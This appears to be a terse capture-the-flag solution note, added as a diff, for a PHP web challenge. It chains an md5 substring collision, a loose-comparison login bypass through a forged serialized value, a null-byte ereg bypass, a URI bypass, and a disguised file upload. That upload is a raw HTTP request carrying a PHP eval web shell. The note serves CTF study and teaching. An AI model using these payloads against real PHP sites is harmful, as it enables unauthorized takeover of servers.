@@ -1,0 +1,51 @@
+substr(md5($_GET[\'source\']),3,6)=="81a427"
+0k3~
+4c481a427cf4b427ff7b3bdbc3bf04e7
+t&f5
+2de81a427c629ecf1ec8c9e8fd25c602
+
+http://4e79618700b44607c.jie.sangebaimao.com/index.php?source=0k3~
+
+<a href="WoShiYuanMa_SGBM.zip" alt="看这里"></a>
+var_dump('admin'==0);
+bool(true)
+var_dump('admin'===0);
+bool(false)
+http://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp
+
+php serial_password.php 
+http://4e79618700b44607c.jie.sangebaimao.com/index.php
+username=admin&password=a:2:{s:8:"username";i:0;s:8:"password";i:0;}&submit=Submit%2Bto%2Blogin
+
+%00 bypass ereg  
+
+http://4e79618700b44607c.jie.sangebaimao.com/main.php
+salt=9e9%00*SGBM*&submit=Submit
+
+Bypass request uri
+http://4e79618700b44607c.jie.sangebaimao.com/admin/index.php/admin/index.php
+
+Bypass blacklist  
+upload .inc file  
+
+POST /ctfs/SGBM_20160521/admin/upload.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/ctfs/SGBM_20160521/admin/upload.php
+Cookie: source=WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr; PHPSESSID=dl838uhrqp6buiaqtfrheut6d2
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------16484400928503
+Content-Length: 230
+
+-----------------------------16484400928503
+Content-Disposition: form-data; name="file"; filename="webshell_my123.inc"
+Content-Type: image/gif
+
+<?php @eval($_POST['chopper']);?>
+-----------------------------16484400928503--
+
+
+use script to burp filename.
